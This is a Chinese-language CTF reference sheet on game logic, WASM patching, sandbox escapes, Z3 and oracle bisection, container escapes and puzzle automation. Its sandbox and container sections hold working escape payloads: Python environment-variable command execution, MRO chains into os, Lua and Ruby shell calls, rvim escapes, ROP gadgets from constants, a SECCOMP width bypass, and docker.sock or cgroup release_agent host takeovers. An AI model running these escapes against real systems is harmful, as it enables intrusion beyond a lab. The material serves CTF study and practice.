# 游戏、虚拟机与约束求解

## 0. 判据速查

| 现象 | 第一动作 | 判据 |
|---|---|---|
| 游戏 AI 不可战胜 / 通关概率荒谬 | 反编译 WASM 或 JS，改判定常量 | 证明/校验是否依赖「走法最优性」 |
| 有 `start` / `win` / `collect` 端点 | 直接按顺序调，跳过玩法 | 校验维度少一项就是缺口 |
| 每轮 seed 固定，或连接时刻相同 | 多连接同步，牺牲一路探路 | 同 seed 才能中继答案 |
| 分数/进度存 cookie | 解码会话 | Flask 签名 ≠ 加密 |
| 需要命中随机 n 位子串 | de Bruijn 序列 | 长度 `k^n + n - 1` |
| 万级 Brainfuck / 自定义 VM 校验输入 | 插桩解释器，找错误计数格 | 逐位可分离即可爆破 |
| 沙箱只按关键词黑名单 | 表索引、编码字面量、层级反射 | 过滤**调用** ≠ 过滤**引用** |
| 断言 `x !== x + 1` 之类数值不变量 | 试 `2^53`、`Infinity`、`NaN`、`-0` | IEEE754 边界 |
| license / keygen / 电路图 / 注册码 | 提取验证逻辑，建模 SAT/SMT | Z3 对 125 变量 250 门毫秒级 |
| 容器内 `docker.sock` 可写 | 建新特权容器挂 `/` | 优先级：privileged > sock > CAP_SYS_ADMIN |
| 只给比较结果，或只给超时/耗时 | 二分 | 每个布尔泄漏 `O(log N)` |
| 谜题实例数量是 8 的倍数 | 想位编码 | 找不变量 → 1 bit/实例 |
| 给了若干「某坐标朝某方向」的观察 | 反推游戏随机种子（坐标→seed 是确定函数） | 低 16 位丢失 → 枚举坐标空间，见 §7.1 |
| 要求提交「推理规则」而非答案（`.dl` / Datalog） | 利用引擎语义：symbol 序号、`__LINE__`、优化顺序 | 白名单只查字符不查语义，见 §4.4 |

## 1. 游戏逻辑与客户端验证

### 1.1 校验与玩法解耦（最优先看）

**判据**：证明/校验的输入只有「走法坐标 + seed」，与走法质量无关。此时不要试图赢，去**改游戏**。

```bash
wasm2wat main.wasm -o main.wat
# 找 minimax 的 bestScore 初始化：-1000 改成 1000
# 比较符反转：i64.lt_s -> i64.gt_s（选最差走法）
wat2wasm main.wat -o main_patched.wasm
```

```javascript
const go = new Go();
const { instance } = await WebAssembly.instantiate(fs.readFileSync("main_patched.wasm"), go.importObject);
go.run(instance);
InitGame(proof_seed);
for (const m of [0, 3, 6]) PlayerMove(m);   // 打弱化后的 AI
const data = GetWinData();                  // moves + proof 仍然合法
```

**同理**：只要服务端验证 `(moves, proof)` 而不复算最优性，任何「改逻辑让对手变菜 / 改常量让概率变 100%」都成立。

### 1.2 服务端校验维度缺失

逐个砍维度验证：位置？输入序列？实际耗时？碰撞？只要有一项没被校验，就绕过它。

```python
s.post(f"{T}/api/start")
time.sleep(25)                              # 地图 4800px / 240px·s⁻¹ = 20s
s.post(f"{T}/api/collect_flag", json={'session_id': sid})
print(s.post(f"{T}/api/win", json={'session_id': sid}).json()['flag'])
```

**WebSocket 版**：游戏状态在浏览器 JS 里，`player.x` / `player.y` 直接改，再调 `verifyProgress(...)` 让服务端记账。提示词按「协议/端口/状态码」映射成坐标（`mosquito` → Mosquitto → MQTT `1883`；`not available` → `404`）。

### 1.3 会话即存档

失败会重置进度时，把 cookie 当存档点：每次尝试前存快照，失败后回滚，进度不丢，于是可确定性爆破。

```python
ckpt = s.cookies.get_dict()
for tile in range(1, 10):
    if s.post(f"{U}/api/click", json={'clicked': tile}).json().get('correct'):
        break
    s.cookies.clear(); s.cookies.update(ckpt)   # 回滚
```

**Flask 会话泄漏**：签名但不加密，`flask-unsign -d -c '<cookie>'` 无需密钥即可读出服务端塞进会话的正确答案/食物坐标。识别特征：base64 + `.` 分段（itsdangerous 格式）。

### 1.4 浮点与经济系统

**判据**：小数 × 巨大乘数（`1e15` 量级）会产生正的小数残差，而「只能卖整数份」把残差留在库存里变成免费余额。

```python
# 0.56 * 1e15 = 560000000000000.0625  ← 残差 0.0625
# (5.0-0.56) * 1e15 = 4439999999999999.5 → 加回整数部分后 FP 舍入成整 5e15
for i in range(1, 500):
    x = i / 100.0
    inv, bal = x * MULT, (5.0 - x) * MULT
    sell = int(inv)                       # 只卖整数部分
    if bal + sell >= need_bal and inv - sell >= need_fee:
        print("buy", x, "sell", sell); break
```

**红旗**：「时间旅行放大一切」「手续费/门槛」「某操作后不允许小数」「起始值用正常算术不可能赢」。

### 1.5 多阶段交互密码游戏

阶段串联：AES-ECB 解出结果 → 结果派生下一阶段密钥（SHA-256 链）→ 交互对局。对局用承诺-揭示防改答案：

```python
token = hmac.new(session_nonce, f"answer:{answer}".encode(), hashlib.sha256).hexdigest()
# 先发 token → 服务端揭示状态 → 再发 answer；服务端校验 HMAC 一致
```

**组合博弈**：GF(256) 变体 Nim 必须用 Sprague-Grundy，异或和 `0` 为必败位；不是暴力搜索。

```python
def gf256_mul(a, b, poly=0x11b):
    r = 0
    while b:
        if b & 1: r ^= a
        a <<= 1
        if a & 0x100: a ^= poly
        b >>= 1
    return r
```

Python 递归超过 10s 就换 C++：状态压缩成单整数 + `unordered_map<state,bool>` 记忆化；小规模用 `@lru_cache` + `tuple(sorted(state))` 归一化。

## 2. WASM、字节码与内存

**WAT 补丁 vs 内存改值**：前者改二进制（逻辑），后者改加载后的运行态（状态）。线性内存扁平无保护，所有全局变量在固定偏移。

```javascript
const mem = new DataView(instance.exports.memory.buffer);
mem.setInt32(0x102918, 14, true);   // 连胜计数 = 14（需要 15）
mem.setInt32(0x102898, 100, true);  // 胜率 = 100%
instance.exports.flipCoin();        // 下一次必赢
```

偏移用 `wasm-objdump -x game.wasm` 或搜索已知常量定位。**识别**：要求统计上不可能的连续事件（连胜、满分）。

**Roblox place 反逆**：最新版可能是假 flag，必须查版本历史。

```bash
curl -H "Cookie: .ROBLOSECURITY=..." \
  "https://assetdelivery.roblox.com/v2/assetId/${PLACE_ID}/version/$v" -o place_v$v.rbxlbin
```

`.rbxlbin` 分块：`INST`（类桶 + referent）、`PROP`（实例属性，含脚本 `Source`）、`PRNT`（父子树）。提取所有 `PROP.Source` 非空项，按版本 diff 同一路径。`.ROBLOSECURITY` 是全权会话 token，用完立刻轮换。

**PyInstaller**：`python pyinstxtractor.py packed.exe` → `*_extracted/`。反编译报 opcode 错时是改过 `opcode.pyc`：取改版 opcode 表 → 与原版建映射 → 回填目标 `.pyc` 的 opcode 字节 → 正常反编译。

**marshal 分析**：`marshal.load(f)` 后 `dis.dis(code)`；`co_consts` 是字面量、`co_names` 是引用名、`co_code` 是原始字节码，`dis.Bytecode(code)` 可逐指令遍历。**`marshal.loads` 与 `pickle.loads` 等价危险**——服务端 `types.FunctionType(marshal.loads(b64), globals())` 会以服务端 globals 执行任意代码对象。

**memfd_create 打包体**：全程内存执行，磁盘无文件。hook `memfd_create`，或在 `fexecve` 前 dump `/proc/<pid>/fd/*`，拿到明文再常规分析。

**模拟器 ROM 热切换**：`/load` 只换程序内存，**寄存器 / RAM / PC 全保留**。于是可以让 ROM_A 把密钥写进 RAM，停在某个 PC；再 `/load ROM_B`，让 B 在该 PC 处正好是「显示内存」指令 → 用 A 的数据执行 B 的输出。

```python
p.sendlineafter('> ', '/load rom_init.bin')
for _ in range(42): p.sendlineafter('> ', '/step')   # 密钥已入内存
p.sendlineafter('> ', '/load rom_display.bin')       # PC 不变
p.sendlineafter('> ', '/step')                       # 触发泄漏
```

**识别**：调试器有 `/load /step /run /dump`，给了多个 ROM 文件，题目提到 "hot swap" / "state preservation"。

## 3. 沙箱逃逸：按接口层级找，不按黑名单找

### 3.1 Python 环境变量

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0 BROWSER="/bin/sh -c 'cat /flag' %s"
```

`PYTHONWARNINGS` 里的 `antigravity` 会触发 `import antigravity`，它用 `$BROWSER` 打开 URL → 命令执行。同类：`PYTHONSTARTUP`（交互启动执行脚本）、`PYTHONPATH`（模块劫持）、`PYTHONINSPECT`（脚本后进交互）。

### 3.2 自制指令集（PROP / CALL 遍历 MRO）

只黑名单 "flag" 时，`PROP`（取属性）+ `CALL`（调用）等价于 Python 的 `getattr` 链，与 Jinja2 SSTI 同构：

```text
LD 0x48656c6c6f A     # 字符串对象
PROP __class__ A      # str
PROP __base__ E       # object
PROP __subclasses__ E
CALL E                # 所有子类列表
IDX 138 E             # os._wrap_close（索引随版本变，要遍历找）
PROP __init__ E
PROP __globals__ E
PUSH 0x5f5f6275696c74696e735f5f   # "__builtins__" 十六进制，绕关键词
CALL __getitem__ E
PUSH 0x666c61672e747874           # "flag.txt"
CALL open E
CALL read E
STDOUT E
```

要点：十六进制字面量绕字符串过滤；未知路径用 `os.popen('ls /').read()` 再 `cat /flag*`；故意报错会泄漏 Python 内部结构与可用类名。

### 3.3 Lua / Ruby

Lua 沙箱通常只封**调用**不封**查表**：`os["execute"]("cat /flag")`、`"exe".."cute"` 拼接、`io.popen`、`loadstring`（5.1 的 `load` 别名）、`debug.getregistry()`、外部 `luac` 编译后加载字节码绕源码过滤。

Ruby 用 `set_trace_func` 监控时，`TracePoint.trace(:c_call)` 在 C 扩展层先触发，早于 Ruby 层事件系统：

```ruby
TracePoint.trace(:c_call) { |tp| system('sh') }   # 下一次任意 C 方法调用即落地
```

### 3.4 受限 vim / rvim

`rvim` 只封 `:!` 与 `:shell`，**脚本接口仍在**。`rvim -u evil.vimrc` 在限制完全生效前加载配置：

```bash
printf ':python3 import os; os.system("/bin/bash")\n:q!\n' > /tmp/e.vimrc
sudo -u secretuser rvim -u /tmp/e.vimrc /dev/null
```

`:` 被彻底禁掉时走 normal 模式：`CTRL-W F` 拆窗并开 netrw 浏览当前路径 → 直接读任意文件；光标停在关键字上按 `K` 打开 man page，man 里按 `!` 起 shell。审计 vim 沙箱先试这三个原语（`<C-W>F`、`K`、`gF`）。

### 3.5 C 代码 jail（emoji 标识符 + 常量嵌 gadget）

只允许 `(){}[];,=.+*%@#~` 与 emoji 时：`(😃==😃)` 是编译期常量 `1`，用加乘拼出任意整数。`-O0` 下 `var = var + C` 编译成 `05 XX XX XX XX`（`add eax, imm32`），跳到 `+1` 即把常量当指令执行：

| 目标字节 | 指令 | 常量 |
|---|---|---|
| `0f 05 c3` | syscall; ret | 12780815 |
| `58 c3` | pop rax; ret | 50008 |
| `5f c3` | pop rdi; ret | 50015 |
| `5e c3` | pop rsi; ret | 50014 |
| `5a c3` | pop rdx; ret | 50010 |
| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268 |

用 `push rsp; pop rsi; syscall` 把 ROP 链直接读进栈返回地址，再 `mprotect(0x404000,0x2000,7)` → `read` → 跳 shellcode（`cat /flag*` 兜未知路径）。

**前提**：`-static -nostartfiles -nostdlib` → 无 libc、无 CRT、**无 ASLR**，每个 emoji 函数落在可预测地址（`0x401000`、`0x40101c`…）。看到这组编译选项就直接硬编码地址。

### 3.6 污点/信息流类型系统

**判据**：类型检查看**表达式的标签**，不看**数据流**。两种典型缺口：

1. `if` 的保密标签不向分支传播 → 用返回值类型匹配的 `if` 选「空函数 vs 泄漏函数」；
2. 函数类型强制转换（`:> private (int -> private unit)`）隐藏副作用 → 选中的函数改的是 public ref。

```ml
let test = fn (bit:int) => if !secret < bit then () else (secret := !secret - bit; leaked := !leaked + bit) in
test 128; test 64; ... test 1;  !leaked   (* 公开 ref 泄漏私有字节 *)
```

纯度检查不分析函数内部，所以副作用必须藏在函数体里。

### 3.7 SECCOMP 参数宽度不匹配

BPF 按 64 位比较，内核 `close()` 收 `int`（32 位）：

```c
close(0x8000000000000002);        // 过滤器看到 != 2 → 放行；内核截断成 2 → 真的关掉 fd 2
open("/proc/self/mem", O_WRONLY); // 拿回 fd 2
```

通用判据：**任何被过滤的 syscall 都要检查参数宽度/符号**。宽 64 判窄 32、有符号判无符号都是缺口。

## 4. 约束求解与 oracle 二分

### 4.1 Z3 建模

```python
from z3 import *
flag = [BitVec(f'f{i}', 8) for i in range(N)]
s = Solver(); s.add(flag[0] == ord('f'))
if s.check() == sat: print(bytes(s.model()[f].as_long() for f in flag))
```

**布尔门网络**（license / product key）：125 输入 + 250 门，每门一条约束，所有门输出必须为 True。

```python
wires = {i: Bool(f"x_{i}") for i in range(125)}
for g, a, b, out in gates:
    wires[out] = {"AND": And, "OR": Or, "XOR": Xor}[g](wires[a], wires[b]) if g != "NOT" else Not(wires[a])
    solver.add(wires[out] == True)
bits = [1 if is_true(m.eval(wires[i], model_completion=True)) else 0 for i in range(125)]
```

`model_completion=True` 必须加，否则未约束变量求值成 `None` 而不是 `False`。

**其他约束源**：YARA 规则（字面量字节 + 字符范围）、OCaml GADT / 高级类型（不编译，正则抽 `( ... ) ..._t` 直接转约束）。

### 4.2 把任何布尔泄漏变成二分

```python
guess = 0
for sh in range(30, -1, -1):
    guess += 1 << sh
    if oracle(guess) > 0: guess -= 1 << sh   # 猜大了就退回去
```

适用于：只给比较的 DSL、正则是否匹配、HTTP 状态码、计时差异。

**计时版**（脚本引擎 eval 有超时）：正确字符让它 `pause(10000)` 撞超时，错误字符立刻返回，`response_time > 5` 即真值。

**Levenshtein oracle**：空串 → 得长度；`c * length` → 得该字符出现次数（`count = len - d`）；再用「一半已知存在字符、一半已知不存在」二分定位。总复杂度 `O(n log n)`。

### 4.3 多连接 oracle 中继

服务端按连接时刻取 seed、多连接共享同一序列时：开 `N+1` 路，每轮牺牲一路暴力试出答案，其余路等 barrier 后跟着提交。

```python
barriers = [threading.Barrier(NUM - i) for i in range(ROUNDS)]
if index == round_num:            # 牺牲者：暴力探测
    for g in range(100):
        sock.send(str(g).encode())
        if b'correct' in sock.recv(1024): answers[round_num] = g; break
else:
    barriers[round_num].wait(); sock.send(str(answers[round_num]).encode())
```

### 4.4 把「逻辑引擎」当解题器：Soufflé / Datalog

题目让你提交**推理规则**而不是答案（提交的是一行 `GUESS(x) :- ...`，服务端编译进 Datalog 程序再跑），考点就从「求解约束」变成「**利用引擎自身的语义特性**」。

**判据**：给的是 `.dl` 文件 + 一个 `--no-preprocessor` 的执行命令 + 规则字符白名单。白名单通常禁掉最直接的写法（禁 `F`、`f`、`.` 让你写不出 `FLAG(x)`），这时要在语义层绕。引擎本体是 Soufflé（Datalog 的高性能实现，静态分析领域常用），编译命令形如 `souffle -D- -lhash --no-preprocessor -w prog.dl`。

Soufflé 里最常被利用的三个特性：

| 特性 | 用法 | 为什么能绕 |
|---|---|---|
| **symbol table 序号** | `ord(@GETFLAG())` 得序号，`as(<序号>, symbol)` 还原字符串 | 序号是整数，可参与算术；白名单只查字符不查语义 |
| **序号差值稳定** | 其他字符串序号与 flag 序号之差固定 | 用 `ord("已知串")` 加偏移推 flag 序号，避开直接引用 |
| **`__LINE__` 常量** | 规则所在行号可当整数常量 | 服务端按模板替换占位符，行号可预测 |

**两个必踩的坑**（都是引擎优化导致，不是写法错）：

1. **死代码消除**：若你的规则只写 `x = as(__LINE__ - N, symbol)`，则 `FLAG` 关系没有被任何输出间接引用，**被优化删除**——于是外部 functor 从没执行过，flag 字符串根本没进 symbol table，`as(...)` 取到的是别的串。修法：在规则里加一个对 `FLAG` 的依赖，例如 `HINT(_)`，强制它被求值。
2. **输出顺序**：规则里引用 `SALT` 会让 `SALT` 先被求解并输出，而服务端只接受以 `GUESS` 开头的输出，于是报错。修法：避开 `SALT`，改用不产生输出关系的锚点。

**纪律**：这类题读引擎文档比读代码有效。判据是「引擎在求值前做了哪些优化」——死代码消除、常量折叠、求值顺序，三条各自对应一个绕过点。

## 5. 容器与构建系统逃逸

**优先级**：`--privileged` → `docker.sock` → `CAP_SYS_ADMIN` → 纯信息泄漏。

```bash
# privileged：直接挂宿主根
fdisk -l; mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# docker.sock：造一个新的特权容器挂 /
docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'

# CAP_SYS_ADMIN：cgroup release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\ncat /flag > /tmp/cgrp/x/flag\n' > /cmd && chmod +x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs
```

## 6. 图像 / 谜题自动化

**像素采样 BFS 迷宫**：每个逻辑格采**中心**一个像素（不是边界，否则墙厚污染结果），`1` = 墙，BFS 输出 WASD 串。同款可用于彩色迷宫（RGB 比较）和仿射校正后的等距 3D 网格。

```python
grid = []
for r in range(rows):
    grid.append([1 if img[r*C + C//2, c*C + C//2] < 128 else 0 for c in range(cols)])
```

**碎纸片重组**：每条纸带的左右边缘编成位掩码（暗像素置位），`popcount(a.trace_last ^ b.trace_first)` 即相邻代价，贪心最小化 Hamming 距离。方向先用 token 位置判。

**Nonogram → QR**：解析行列约束 → 交给 `nonogram` 命令行求解器 → 文本网格按 `cell_size` 画成图 → `qrtools` 解码。**画 QR 必须留 quiet zone**（白边），否则解不出。

**QR 列级重组**：不要碰 `21!` 排列。用 QR 不变量剪枝：三个 finder pattern、它们之间的 timing pattern、固定 dark module、第 8 列的 15 位 format string **只有 32 种合法值**（EC level × mask）。先按结构筛列，再对剩下的少量排列试解码。

**动态字体 CAPTCHA**：Selenium 截图 + Tesseract OCR，页面先 `zoom='450%'`，OCR 后修常见误判（`x`→`*`、`{`→`(`、`}`→`)`）再 `eval`。生命周期 5 秒的 CAPTCHA 对 1 秒级循环毫无抵抗力。

**大数量拼图（几百到上千块）**：手拼不可能，判据是「**块数 × 单块尺寸能否凑成矩形**」——先算宽高，再上自动求解器。

```bash
# 1. 先拼成一张大图并确定网格（tile=列x行，geometry=缝隙）
montage pieces/*.png -tile 30x20 -geometry 40x40+0+0 -background black out.png

# 2. gaps 自动拼图（遗传算法，poetry 安装）
poetry install && poetry run gaps --image out.png --generations 5000 --population 200 --size 40
```

**三个参数决定成败**：

| 参数 | 怎么定 | 错了的表现 |
|---|---|---|
| `--size` | 单块边长（题目常给，或图宽 / 列数） | 块边界错位，越拼越乱 |
| `--generations` | 从 500 起，不够就翻倍 | 拼出一半、剩余区域是噪声 |
| `--population` | 100–500 | 太小陷入局部最优 |

**先算网格再拼**：`600 块 × 40px` → 面积 960000 px² → 若 40×40 则总图 `800×1200` 即 `20×30` 或 `30×20`。**两种朝向都试**，montage 拼出来的长宽比一眼能看出来对不对。

`gaps` 跑完还有少量块错位时，**不要从头重跑**——把已拼好的大图裁成块反喂，或直接按「边缘像素相关性」手工修最后几十块，比调参快。

## 7. 数学与编码套路

| 套路 | 判据 | 关键式 |
|---|---|---|
| 序列题 | 直接查 OEIS | `oeis.org/search?q=<逗号分隔项>`，取首条结果第 `len(seq)` 项 |
| 大 N 线性递推 | `N` 到 `10^12` | 2×2 矩阵 `[a_{n+1}; a_n] = M·[a_n; a_{n-1}]`，快速幂 `O(log N)` |
| 跳台阶 | 「跳 1/2/3 阶有多少种」 | Tribonacci `f(N)=f(N-1)+f(N-2)+f(N-3)` |
| 随机子串命中 | 输入长度上限 ≈ `k^n + n - 1` | de Bruijn `B(k,n)`，线性化补前 `n-1` 位 |
| 多谜题实例 | 实例数 % 8 == 0 | 找不变量当 1 bit（15-puzzle：逆序数 + 空格距底行 奇偶） |
| JS 数值断言 | `x !== x + 1` | `x = 2^53` 时 `x + 1 === x` |
| Benford 分布校验 | 要求首位数字频率 | `P(d) = log10(1 + 1/d)`，容差通常 ±5% |
| 100 囚犯 | 「不可能的概率」 | 跟随置换环，成功率 `1 - ln 2 ≈ 0.3069` |
| XSLT / 纯模板 | 只执行模板 | `xsl:choose` + 递归 `call-template` = 图灵完备，先搭二分原语 |
| 字节序列输出 | 变量 `t`、移位混模运算、8 位无符号 | bytebeat，直接播来听 |

```python
def de_bruijn(k, n):
    a, seq = [0]*k*n, []
    def db(t, p):
        if t > n:
            if n % p == 0: seq.extend(a[1:p+1])
        else:
            a[t] = a[t-p]; db(t+1, p)
            for j in range(a[t-p]+1, k): a[t] = j; db(t+1, t)
    db(1, 1); return seq
payload = ''.join(map(str, de_bruijn(2, 12)))   # 4096 位
payload += payload[:11]                          # 4107，覆盖所有 12 位串
```

**多层 esolang**：Brainfuck（`+-<>.,[]`）输出 URL → 下载缩略图 → 裁掉边框像素 → `npiet` 执行 Piet（彩色块网格）。Whitespace 是隐形空白。题目提到多种「奇怪格式」就按层依次解。

**15-puzzle 位编码**：`4×4` 可解 ⟺ `(逆序数 + 空格距底行行数) % 2 == 0`。所有排列中恰好一半可解，天然 1 bit/实例。

## 7.1 游戏内随机数：从坐标反推种子

游戏世界里的「随机」几乎都是**坐标的函数**，不是真随机。给定若干「某坐标朝某个方向」的观察，就能反解出种子或坐标。

**Minecraft 一类（Java `Random`）的判据链**：

```java
// 坐标 → 种子（Math#getSeed 的变体）
long l = (long)(x * 3129871) ^ (long)z * 116129781L ^ (long)y;
l = l * l * 42317861L + l * 11L;
long seed = l >> 16;                       // 只取高位，低位被丢弃

// 种子 → 伪随机序列（Java LCG）
// seed 先 XOR 0x5DEECE66D，next(32) 每次 state = state*0x5DEECE66D + 0xB
// nextLong() = (next(32) << 32) + next(32)
// 结果 % 4 就是朝向
```

**关键判据**：`seed = l >> 16` 说明**低 16 位信息已丢失**，所以坐标无法从种子唯一反推——必须**枚举坐标空间**逐个验证。范围由题面给（常见 `x,z ∈ [-20000, 20000]`、`y ∈ [0,256]`）。

```python
M = 0x5DEECE66D
A = 0x5DEECE66D
C = 0xB
MASK = (1 << 48) - 1

def rotation(x, y, z):
    l = ((x * 3129871) ^ (z * 116129781) ^ y) & ((1 << 64) - 1)
    l = (l * l * 42317861 + l * 11) & ((1 << 64) - 1)
    seed = l >> 16                                   # 有符号右移在 Java 里按 64 位符号扩展
    state = (seed ^ A) & MASK
    state = (state * M + C) & MASK                   # next(32) 第 1 次
    hi = state >> 16
    state = (state * M + C) & MASK                   # 第 2 次
    lo = state >> 16
    v = ((hi << 32) + lo) & ((1 << 64) - 1)
    if v >= (1 << 63): v -= (1 << 64)                # 转有符号
    return abs(v) % 4
```

**降维技巧**：三维枚举是 `4e4 × 256 × 4e4`，跑不完。做法是**先用 2-3 个观察把 y 或 z 定死**——同一 `(x,z)` 下不同 `y` 的朝向差异可用来筛 y；或把「相邻坐标朝向」当成约束对 `(x,z)` 做剪枝。

**其他引擎的对应关系**：

| 引擎 | 随机源 | 反推判据 |
|---|---|---|
| Java `Random` | 48 位 LCG，`next(32)` 取高位 | 有 2 个连续 `nextLong` 输出即可解状态 |
| C `rand()`（glibc） | 加法反馈，`rand()` 返回 `state>>1` | 需 31 个以上连续输出 |
| Python `random` | MT19937，32 位输出 | 624 个连续输出还原完整状态 |
| Unity `Random` | xorshift128 | 4 个连续 32 位输出可解 |
| 自研 | 看代码 | 先找递推式，再判是否线性 |

**MT19937 的 `randrange`/`randint` 陷阱**：`random.randint(0, 3)` 不是直接取 32 位输出的低 2 位，而是用 `_randbelow` 做拒绝采样——直接套「取低位」会得到错误状态。判据：**输出范围不是 2 的幂时，必须按拒绝采样模型还原**，否则 624 个样本解不出正确状态。

## 8. 纪律

- 游戏题第一步永远是**列出所有校验维度**（位置、序列、耗时、概率、最优性），不是先玩。
- 客户端有逻辑就先看**能不能改**，再考虑能不能赢；WAT 补丁改逻辑，线性内存改状态。
- 沙箱题先跑 `:version` / `dir()` / 可用表清单，找**没被封的接口**（`io.popen`、`debug`、`python3`、netrw、man `!`），不要死磕黑名单。
- 自制语言先读 `/docs` `/help`，找「返回寄存器」和字符串编码方式；报错信息本身是泄漏。
- 所有 oracle 题先问「这是不是布尔」，是就二分；不是就找 Levenshtein 这类可量化距离。
- 交互题注意**连接时序与 seed 关系**，同 seed 才能多路中继。
- 容器题按 `capsh --print` → socket → mount → 信息泄漏的顺序试，别一上来就挖内核。
- 数学题先查 OEIS，再想矩阵快速幂；能用库就别手写求解器。
- 看到「统计上不可能」的要求（连胜、满分、完美通关），答案几乎总是改状态而不是赢。
- 内部交叉参考：Python 沙箱细节见 [[misc/沙箱逃逸/Python 沙箱逃逸.md|Python 沙箱逃逸]]，编码层套路见 [[misc/编码解码/高级编码与专用格式判定.md|高级编码]]。
